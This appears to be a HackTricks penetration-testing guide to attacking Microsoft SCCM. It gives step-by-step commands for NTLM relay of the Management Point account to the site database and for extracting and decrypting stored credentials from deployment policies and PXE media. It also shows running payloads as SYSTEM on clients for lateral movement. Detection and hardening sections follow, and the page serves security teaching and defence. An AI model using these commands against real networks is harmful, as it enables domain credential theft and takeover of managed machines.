# SCCM / MECM Abuse: Policy Secrets and Client Execution

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.<sup>[[2]](#references)</sup>

High-level chain:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
   * `use CM_<SiteCode>`
   * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
   * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
The MP ISAPI extension **GetAuth.dll** exposes several parameters that don’t require authentication (unless the site is PKI-only):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists every Management-Point in the site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |

Grab the GUIDs that will act as the **clientID** for later DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```

---

## 2. Relay the MP machine account to MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)                              
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
       -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
When the coercion fires you should see something like:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```

---

## 3. Identify OSD policies via stored procedures
Connect through the SOCKS proxy (port 1080 by default):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).

### 3.1  Find Unknown-Computer GUIDs (optional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```

### 3.2  List assigned policies
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Focus on policies:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – Can contain run-as accounts

### 3.3  Retrieve full body
If you already have `PolicyID` & `PolicyVersion` you can skip the clientID requirement using:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: In SSMS increase “Maximum Characters Retrieved” (>65535) or the blob will be truncated.

---

## 4. Decode & decrypt the blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Recovered secrets example:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```

---

## 5. Relevant SQL roles & procedures
Upon relay the login is mapped to:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

These roles expose dozens of EXEC permissions, the key ones used in this attack are:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | List policies applied to a `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Return complete policy body. |
| `MP_GetListOfMPsInSiteOSD` | Returned by `MPKEYINFORMATIONMEDIA` path. |

You can inspect the full list with:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
  AND  pe.permission_name='EXECUTE';
```

---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: send a PXE boot request to a Distribution Point configured for PXE. The proxyDHCP response reveals boot paths such as `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) and `SMSBoot\\x64\\pxe\\boot.bcd`, plus an optional encrypted key blob.<sup>[[4]](#references)</sup>
* **Retrieve boot artifacts via TFTP**: use the returned paths to download `variables.dat` over TFTP (unauthenticated). The file is small (a few KB) and contains the encrypted media variables.
* **Decrypt or crack**:
  - If the response includes the decryption key, feed it to **SharpPXE** to decrypt `variables.dat` directly.
  - If no key is provided (PXE media protected by a custom password), SharpPXE emits a **Hashcat-compatible** `$sccm$aes128$...` hash for offline cracking. After recovering the password, decrypt the file.
* **Parse decrypted XML**: plaintext variables contain SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs, and other identifiers). SharpPXE parses them and prints a ready-to-run **SharpSCCM** command with GUID/PFX/site parameters prefilled for follow-on abuse.
* **Requirements**: only network reachability to the PXE listener (UDP/4011) and TFTP; no local admin privileges are needed.

---

## 7. SCCM client execution for lateral movement

This is **abuse of legitimate deployment authority**, not an unauthenticated SCCM vulnerability: the operator must already hold a role that can deploy applications or create/approve client scripts (or control a component/account with those rights). The resulting execution can run as the logged-on user or as `SYSTEM`, making a compromised SCCM control plane a high-impact lateral-movement primitive.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

### Client scripts with SCCMHunter

After connecting to the site server with [SCCMHunter](https://github.com/garrettfoster13/sccmhunter), resolve the target to its SCCM resource ID, enter its context, and submit a PowerShell script. The tool can create, approve, execute, retrieve the result of, and remove the temporary SCCM script; sites that prohibit an author from approving their own script require separate approval credentials.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
python3 sccmhunter.py admin -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ip <SITE_SERVER>
() C:\ >> get_device <TARGET>
() (C:\) >> interact <RESOURCE_ID>
(<RESOURCE_ID>) (C:\) >> script /path/to/payload.ps1
```

The usual client-side ancestry is `CcmExec.exe -> PowerShell.exe`. If the script writes through `$env:USERPROFILE` and the result lands below `C:\Windows\System32\config\systemprofile`, the selected execution context was `SYSTEM`.<sup>[[7]](#references)</sup>

### Application deployment with SharpSCCM

[SharpSCCM](https://github.com/Mayyhem/SharpSCCM) can create a temporary application/deployment for a device and execute a command, local path, or UNC path. `-s` selects the `SYSTEM` context; without it, `exec` defaults to the logged-on user. The path must already be reachable by the selected target/context.<sup>[[5]](#references)[[7]](#references)</sup>

```powershell
SharpSCCM.exe exec -d <TARGET_DEVICE> -p C:\Temp\payload.exe -s
```

Application execution has a different ancestry from the client-script feature. `CcmExec.exe` receives policy and uses `CITaskMgr.dll` to submit an asynchronous local WMI request; the already-running `WmiPrvSE.exe` hosting the SCCM provider performs process creation. Consequently, a detector limited to `CcmExec.exe -> PowerShell.exe` misses application-deployment execution.<sup>[[7]](#references)[[8]](#references)</sup>

```text
CcmExec.exe
  -> CITaskMgr.dll
  -> root\CCM\CIModels:CCM_AppDeliveryType.EnforceApp
  -> IWbemServices::ExecMethodAsync

WmiPrvSE.exe
  -> AppProvider.dll -> ScriptHandler.dll -> AppExcnLib.dll
  -> ccmcore.dll!CcmCreateProcessEx / CcmCreateProcessAsUserEx
  -> CreateProcessW / CreateProcessAsUserW
  -> deployed process
```

The request carries `AppDeliveryTypeId`, `Revision`, `ContentPath`, `ActionType`, `UserSid`, and `SessionId`. `AppProvider.dll` reads those inputs, resolves the deployment synclet, and reaches `AppExcnLib.dll!CAppExecutionLibrary_RunCmdAsUser`; the SCCM wrapper in `ccmcore.dll` then creates the process. This explains why `WmiPrvSE.exe`, rather than `CcmExec.exe`, is recorded as the payload's parent.<sup>[[7]](#references)</sup>

> **Reverse-engineering hint:** in a 64-bit COM call decompiled as `(**(code **)(*services + 0xc8))(services, ...)`, divide the byte offset by the pointer size: `0xc8 / 8 = 25`. Mapping slot 25 in `IWbemServices` identifies `ExecMethodAsync`, which immediately returns while WMI forwards the request to the provider.<sup>[[7]](#references)[[8]](#references)</sup>

### Hunting application and package execution

Correlate **module loads with process creation**, rather than depending only on parent names. With Sysmon Image Load telemetry enabled, find `WmiPrvSE.exe` instances that load `C:\Windows\CCM\AppProvider.dll`, then join that process's `ProcessGuid` to later process-creation events whose `ParentProcessGuid` matches. Group the child image and command line across endpoints: a payload seen on only a few clients is worth prioritizing over a common deployment launcher. Rarity is a heuristic, not proof—legitimate one-off deployments exist and an adversary can deploy broadly.<sup>[[7]](#references)</sup>

Account for these blind spots when baselining:<sup>[[7]](#references)</sup>

- An x86 application may produce `WmiPrvSE.exe -> C:\Windows\CCM\Ccm32BitLauncher.exe -> application` rather than a direct application child.
- A **package** deployment can skip `WmiPrvSE.exe` entirely: `CcmExec.exe -> Ccm32BitLauncher.exe -> package payload`.
- An application deployment can intentionally launch PowerShell, producing `WmiPrvSE.exe -> PowerShell.exe`; PowerShell Script Block Logging (event ID `4104`) remains useful for recovering script content.

On clients, collect `C:\Windows\CCM\Logs\AppEnforce.log` for application install/uninstall enforcement details. `execmgr.log` instead records packages and task sequences, so ingest both when hunting across application and package deployment paths.<sup>[[9]](#references)</sup>

---

## 8. Detection & Hardening
1. **Monitor MP logins** – any MP computer account logging in from an IP that isn’t its host ≈ relay.<sup>[[1]](#references)</sup>
2. Enable **Extended Protection for Authentication (EPA)** on the site database (`PREVENT-14`).
3. Disable unused NTLM, enforce SMB signing, restrict RPC (
   same mitigations used against `PetitPotam`/`PrinterBug`).
4. Harden MP ↔ DB communication with IPSec / mutual-TLS.
5. **Constrain PXE exposure** – firewall UDP/4011 and TFTP to trusted VLANs, require PXE passwords, and alert on TFTP downloads of `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:
  
{{#ref}}
  ../ntlm/README.md
  {{#endref}}

* MSSQL abuse & post-exploitation:
  
{{#ref}}
  abusing-ad-mssql.md
  {{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)
- [5] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
- [6] [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
- [7] [Unmasking SCCM Application Execution](https://specterops.io/blog/2026/09/10/unmasking-sccm-application-execution/)
- [8] [IWbemServices::ExecMethodAsync method](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execmethodasync)
- [9] [Log file reference - Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)

{{#include ../../banners/hacktricks-training.md}}
